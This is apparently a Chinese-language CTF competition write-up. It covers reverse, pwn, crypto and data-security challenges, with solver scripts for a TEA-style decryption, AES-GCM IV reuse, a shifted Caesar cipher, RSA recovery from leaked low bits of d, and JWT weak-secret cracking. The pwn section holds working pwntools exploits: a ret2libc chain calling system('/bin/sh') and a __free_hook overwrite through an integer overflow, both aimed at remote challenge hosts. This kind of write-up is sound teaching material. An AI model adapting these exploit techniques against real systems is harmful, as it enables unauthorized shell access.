class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], delta = <span class="hljs-number">0x768CAB2E</span>;<br>    <span class="hljs-type">int</span> sum=delta*(<span class="hljs-number">-32</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        v1 -= ((v0 &lt;&lt; <span class="hljs-number">4</span>) + key[<span class="hljs-number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + key[<span class="hljs-number">3</span>])^sum;<br>        v0 -= ((v1 &lt;&lt; <span class="hljs-number">4</span>) + key[<span class="hljs-number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + key[<span class="hljs-number">1</span>])^sum;<br>        sum += delta;<br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0;<br>    v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> key[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> v5[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0x569a1c45</span>,<span class="hljs-number">0xEF2C6A10</span>,<span class="hljs-number">0xFB440BD6</span>,<span class="hljs-number">0x5797F41D</span>,<span class="hljs-number">0x523FF2C3</span>,<span class="hljs-number">0x48337CD9</span>,<span class="hljs-number">0x3616AC2D</span>,<span class="hljs-number">0x6B6312D</span>&#125;; <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i += <span class="hljs-number">2</span>) &#123;<br>        decrypt(&amp;v5[i], key);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (v5[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>#b3d06a66f8aa86e3e6390f615e389e55<br></code></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="account"><a href="#account" class="headerlink" title="account"></a>account</h2><p>已给libc.so利用puts泄露ASLR基址即可。</p><p>逐个发送整数覆盖栈，注意v2作为指针，当覆盖v2时最好保持其值不变。同时libc地址超过了 int 最大值需使用负数令程序读入</p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754464498375-96e8b254-9ba4-4bc5-8acf-1e2da738dd0c-565219.png" alt="1754464498375-96e8b254-9ba4-4bc5-8acf-1e2da738dd0c.png"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> libcfind <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&quot;./account&quot;</span>)<br>p = process(<span class="hljs-string">&quot;./account&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;pss.idss-cn.com&quot;</span>, <span class="hljs-number">22948</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br><span class="hljs-comment">#p = gdb.debug(&quot;./account&quot;,&quot;b *0x080492A5&quot;)</span><br>offset = <span class="hljs-number">13</span><br>p.recv()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,offset+<span class="hljs-number">1</span>):<br>    bstr = <span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    p.sendline(bstr)<br><br>main = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_libc = libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>bin_sh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>system_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload1 = [puts_plt, main, puts_got]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload1:<br>    bstr = <span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    p.sendline(bstr)<br>p.sendline(<span class="hljs-string">b&quot;0&quot;</span>)<br>puts_addr = u32(p.recvuntil(<span class="hljs-string">b&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:])<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>libcbase = puts_addr - puts_libc<br>system_addr = libcbase + system_addr<br>bin_sh = libcbase + bin_sh<br>system_addr = system_addr - <span class="hljs-number">2</span>**<span class="hljs-number">32</span><br>bin_sh = bin_sh - <span class="hljs-number">2</span>**<span class="hljs-number">32</span><br>payload2 = [system_addr,<span class="hljs-number">1</span>,bin_sh]<br>p.recv()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,offset+<span class="hljs-number">1</span>):<br>    bstr = <span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    p.sendline(bstr)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload2:<br>    bstr = <span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    p.sendline(bstr)<br><span class="hljs-comment">#gdb.attach(p, &quot;b *0x080492A5&quot;)</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>比较明显的<code>io_file</code>路子，有点猪脑忘记咋用了，原理网上有介绍。</p><p><code>io</code>总的来说能在没有<code>puts</code>这类函数的时候泄露地址，也能任意地址写。在<code>glibc</code>高版本比较喜欢出这个</p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754473651537-394e8855-3c33-49eb-a419-5aee3be5b2cf-488599.png" alt="1754473651537-394e8855-3c33-49eb-a419-5aee3be5b2cf.png"></p><p><code>add</code>没啥好看的</p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754473682351-9ee17b6a-ad66-4cf6-bbcc-596e1c5d54db-135996.png" alt="1754473682351-9ee17b6a-ad66-4cf6-bbcc-596e1c5d54db.png"></p><p><code>edit</code>有个明显的整数溢出，这里可以往回写</p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754473747346-2c2066e6-24e2-439c-ab81-ebe777b32b78-904885.png" alt="1754473747346-2c2066e6-24e2-439c-ab81-ebe777b32b78.png"></p><p>这里写一下<code>stdout</code>把地址泄露出来</p><p>还有个特别舒服的地址<code>0x55e848636008</code>，这东西指向自己那我们就可以第一次把他改成<code>free_hook</code>，第二次把<code>one_gadget</code>写进<code>free_hook</code>,然后通过free触发就完事了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)   <br><span class="hljs-comment">#p = process(&#x27;./user&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./user&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;pss.idss-cn.com&#x27;</span>,<span class="hljs-number">22028</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">content</span>):<br>        p.sendlineafter(<span class="hljs-string">&quot;5. Exit&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>        p.sendlineafter(<span class="hljs-string">&quot;Enter your username:&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">i</span>):<br>        p.sendlineafter(<span class="hljs-string">&quot;5. Exit&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>        p.sendlineafter(<span class="hljs-string">&quot;index:&quot;</span>,<span class="hljs-built_in">str</span>(i))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">i</span>):<br>        p.sendlineafter(<span class="hljs-string">&quot;5. Exit&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>        p.sendlineafter(<span class="hljs-string">&quot;index:&quot;</span>,<span class="hljs-built_in">str</span>(i))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">i,content</span>):<br>        p.sendlineafter(<span class="hljs-string">&quot;5. Exit&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>        p.sendlineafter(<span class="hljs-string">&quot;index:&quot;</span>,<span class="hljs-built_in">str</span>(i))<br>        p.sendlineafter(<span class="hljs-string">&quot;Enter a new username:&quot;</span>,content)<br><br>add(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>edit(<span class="hljs-built_in">str</span>(-<span class="hljs-number">8</span>),p64(<span class="hljs-number">0xfbad1800</span>)+p64(<span class="hljs-number">0x0</span>)*<span class="hljs-number">3</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>addr = u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base=addr - <span class="hljs-number">1794009</span><br>malloc_hook = libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook = libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>got=libc_base + <span class="hljs-number">0x1EC0A8</span><br>one=libc_base + <span class="hljs-number">0xe3b01</span><br>edit(<span class="hljs-built_in">str</span>(-<span class="hljs-number">11</span>),p64(free_hook))<br>edit(<span class="hljs-built_in">str</span>(-<span class="hljs-number">11</span>),p64(system))<br><br>free(<span class="hljs-number">0</span>)<br>p.interactive()       <br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><font style="color:rgb(27, 28, 29);">Crypto</font></h1><h2 id="AES-GCM-IV-Reuse"><a href="#AES-GCM-IV-Reuse" class="headerlink" title="AES_GCM_IV_Reuse"></a>AES_GCM_IV_Reuse</h2><p><strong><font style="color:rgb(255, 255, 255);background-color:rgba(0, 58, 118, 0.9);">已知密文 ^ 已知明文 ^ 目标密文 &#x3D; 目标明文（flag）</font></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">from binascii import unhexlify<br>from itertools import cycle<br><br>def xor_bytes(a: bytes, b: bytes) -&gt; bytes:<br>    return bytes(x ^ y for x, y in zip(a, b))<br><br>known_plaintext = b&quot;The flag is hidden somewhere in this encrypted system.&quot;<br>known_ciphertext = unhexlify(&quot;b7eb5c9e8ea16f3dec89b6dfb65670343efe2ea88e0e88c490da73287c86e8ebf375ea1194b0d8b14f8b6329a44f396683f22cf8adf8&quot;)<br>target_ciphertext = unhexlify(&quot;85ef58d9938a4d1793a993a0ac0c612368cf3fa8be07d9dd9f8c737d299cd9adb76fdc1187b6c3a00c866a20&quot;)<br><br>keystream = xor_bytes(known_plaintext, known_ciphertext[:len(known_plaintext)])<br>recovered_flag = xor_bytes(target_ciphertext[:len(keystream)], keystream)<br><br>print(&quot;Recovered flag:&quot;, recovered_flag.decode())<br><br></code></pre></td></tr></table></figure><h2 id="多重Caesar密码"><a href="#多重Caesar密码" class="headerlink" title="多重Caesar密码"></a>多重Caesar密码</h2><p><strong>尝试爆破无果</strong></p><p><strong>这里猜出前面是easy，第二个是caesar最后面是attack</strong></p><p><strong><font style="color:#DF2A3F;">错误的脚本</font></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">cipher = &quot;myfz&#123;hrpa_pfxddi_ypgm_xxcqkwyj_dkzcvz_2025&#125;&quot;<br>primes  = [7, 13, 5, 19, 3, 17, 6, 2, 17]<br><br>out, q = [], primes[:]<br>for ch in cipher:<br>    if ch.isalpha():<br>        shift = q[0]<br>        plain = (ord(ch) - ord(&#x27;a&#x27;) - shift) % 26<br>        out.append(chr(plain + ord(&#x27;a&#x27;)))<br>        q.append(q.pop(0))<br>    else:<br>        out.append(ch)<br>        q.append(q.pop(0))<br><br>print(&#x27;&#x27;.join(out))<br></code></pre></td></tr></table></figure><p>结果ai直接非预期出来了</p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754483576689-51ca355e-33e3-4683-a916-bbafba3f8a5d-976623.png" alt="1754483576689-51ca355e-33e3-4683-a916-bbafba3f8a5d.png"></p><p>flag{easy_caesar_with_multiple_shifts_2025}</p><h2 id="rsa-dl-leak"><a href="#rsa-dl-leak" class="headerlink" title="rsa-dl_leak"></a><strong>rsa-dl_leak</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs plain">n = 143504495074135116523479572513193257538457891976052298438652079929596651523432364937341930982173023552175436173885654930971376970322922498317976493562072926136659852344920009858340197366796444840464302446464493305526983923226244799894266646253468068881999233902997176323684443197642773123213917372573050601477<br>c = 141699518880360825234198786612952695897842876092920232629929387949988050288276438446103693342179727296549008517932766734449401585097483656759727472217476111942285691988125304733806468920104615795505322633807031565453083413471250166739315942515829249512300243607424590170257225854237018813544527796454663165076<br>dl = 1761714636451980705225596515441824697034096304822566643697981898035887055658807020442662924585355268098963915429014997296853529408546333631721472245329506038801<br>e = 65537<br>known_bits = 530  # d 的低 530 位已知<br><br>print(&quot;开始攻击：尝试从 d 的低 530 位恢复 RSA 私钥...&quot;)<br>print(f&quot;n has &#123;n.bit_length()&#125; bits&quot;)<br><br># =============== 攻击函数 ===============<br>def recover_pq(n, e, dl, known_bits):<br>    from sage.all import Integer, sqrt, gcd, inverse_mod<br><br>    modulus = e &lt;&lt; known_bits  # 模数是 e * 2^530<br>    dl_mod = dl % (1 &lt;&lt; known_bits)<br><br>    # 枚举 k ∈ [1, e]<br>    for k in range(1, e + 1):<br>        if k % 1000 == 0:<br>            print(f&quot;枚举 k = &#123;k&#125; / &#123;e&#125; ...&quot;)<br><br>        # 我们有：e * d ≡ 1 (mod φ(n)) =&gt; d = (1 + k*φ(n)) / e<br>        # 且 d ≡ dl (mod 2^530)<br>        # 所以：(1 + k*φ(n)) / e ≡ dl (mod 2^530)<br>        # =&gt; 1 + k*φ(n) ≡ e * dl (mod e * 2^530)<br>        # =&gt; k*φ(n) ≡ e*dl - 1 (mod e * 2^530)<br><br>        rhs = (e * dl - 1) % modulus<br>        g = gcd(k, modulus)<br>        if rhs % g != 0:<br>            continue<br><br>        # 解：k * φ(n) ≡ rhs (mod modulus)<br>        try:<br>            phi_mod = (Integer(rhs) // g) * inverse_mod(Integer(k) // g, Integer(modulus) // g)<br>            phi_mod = Integer(phi_mod) % (modulus // g)<br>        except:<br>            continue<br><br>        # φ(n) ≈ n - 2√n + 1<br>        sqrt_n = Integer(n).isqrt()<br>        phi_approx = n - 2*sqrt_n + 1<br><br>        # 遍历所有可能的 φ(n) = phi_mod + t * (modulus // g)<br>        step = modulus // g<br>        t_low = (phi_approx - 2*step - phi_mod) // step<br>        t_high = (phi_approx + 2*step - phi_mod) // step<br><br>        for t in range(t_low, t_high + 1):<br>            phi = phi_mod + t * step<br>            if phi &lt;= 0 or phi &gt;= n:<br>                continue<br><br>            # 由 φ(n) = (p-1)(q-1) = n - p - q + 1<br>            # 得：p + q = n + 1 - φ(n)<br>            s = n + 1 - phi<br>            # 判别式<br>            disc = s^2 - 4*n<br>            if disc &lt; 0:<br>                continue<br>            root_disc = disc.isqrt()<br>            if root_disc^2 != disc:<br>                continue<br><br>            p = (s + root_disc) // 2<br>            q = (s - root_disc) // 2<br><br>            if p * q == n and p &gt; 1 and q &gt; 1:<br>                print(f&quot;成功！找到 p 和 q (k = &#123;k&#125;)&quot;)<br>                return p, q<br><br>    return None<br><br>result = recover_pq(n, e, dl, known_bits)<br><br>if result:<br>    p, q = result<br>    print(f&quot;p = &#123;p&#125;&quot;)<br>    print(f&quot;q = &#123;q&#125;&quot;)<br><br>    phi = (p-1)*(q-1)<br>    d = inverse_mod(e, phi)<br>    m = power_mod(c, d, n)<br>    try:<br>        flag = bytes.fromhex(hex(m)[2:]).decode(&#x27;utf-8&#x27;)<br>        print(f&quot;成功解密 flag: &#123;flag&#125;&quot;)<br>    except:<br>        print(f&quot;解密成功，明文为: &#123;m&#125;&quot;)<br>        print(f&quot;明文 hex: &#123;hex(m)&#125;&quot;)<br><br>else:<br>    print(&quot;攻击失败：未能恢复 p 和 q&quot;)<br>    print(&quot;可能是 k 超出范围，或需要更高级的格攻击&quot;)<br></code></pre></td></tr></table></figure><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754484968392-790b686f-9f54-489a-b470-a76ac980d2a5-861444.png" alt="1754484968392-790b686f-9f54-489a-b470-a76ac980d2a5.png"></p><h1 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h1><h2 id="JWT-Weak-Secret"><a href="#JWT-Weak-Secret" class="headerlink" title="JWT_Weak_Secret"></a>JWT_Weak_Secret</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> jwt.exceptions <span class="hljs-keyword">import</span> InvalidSignatureError, ExpiredSignatureError, DecodeError<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_admin</span>(<span class="hljs-params">payload</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;检查JWT载荷是否具有管理员权限&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> payload.get(<span class="hljs-string">&#x27;admin&#x27;</span>) <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span> <span class="hljs-keyword">or</span> payload.get(<span class="hljs-string">&#x27;role&#x27;</span>) <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;superuser&#x27;</span>]<br><br><span class="hljs-comment"># 读取公钥文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;public.pem&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    public_key = f.read()<br><br><span class="hljs-comment"># 读取弱密码字典</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;wordlist.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    passwords = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f]<br><br><span class="hljs-comment"># 读取JWT令牌</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;tokens.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    tokens = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f]<br><br>valid_admin_tokens = []<br><br><span class="hljs-keyword">for</span> idx, token <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(tokens, start=<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 解析头部获取算法</span><br>        header = jwt.get_unverified_header(token)<br>        alg = header.get(<span class="hljs-string">&#x27;alg&#x27;</span>)<br><br>        <span class="hljs-comment"># HS256算法：使用字典尝试验证</span><br>        <span class="hljs-keyword">if</span> alg == <span class="hljs-string">&#x27;HS256&#x27;</span>:<br>            <span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> passwords:<br>                <span class="hljs-keyword">try</span>:<br>                    payload = jwt.decode(<br>                        token,<br>                        password,<br>                        algorithms=[<span class="hljs-string">&#x27;HS256&#x27;</span>],<br>                        options=&#123;<span class="hljs-string">&#x27;verify_exp&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;verify_signature&#x27;</span>: <span class="hljs-literal">True</span>&#125;<br>                    )<br>                    <span class="hljs-keyword">if</span> is_admin(payload):<br>                        valid_admin_tokens.append(idx)<br>                        <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">except</span> InvalidSignatureError:<br>                    <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-comment"># RS256算法：使用公钥验证</span><br>        <span class="hljs-keyword">elif</span> alg == <span class="hljs-string">&#x27;RS256&#x27;</span>:<br>            payload = jwt.decode(<br>                token,<br>                public_key,<br>                algorithms=[<span class="hljs-string">&#x27;RS256&#x27;</span>],<br>                options=&#123;<span class="hljs-string">&#x27;verify_exp&#x27;</span>: <span class="hljs-literal">False</span>&#125;<br>            )<br>            <span class="hljs-keyword">if</span> is_admin(payload):<br>                valid_admin_tokens.append(idx)<br><br>    <span class="hljs-keyword">except</span> (InvalidSignatureError, ExpiredSignatureError, DecodeError):<br>        <span class="hljs-keyword">continue</span><br><br><span class="hljs-comment"># 输出结果</span><br>valid_admin_tokens.sort()<br>result = <span class="hljs-string">&quot;:&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, valid_admin_tokens))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;flag&#123;&#123;<span 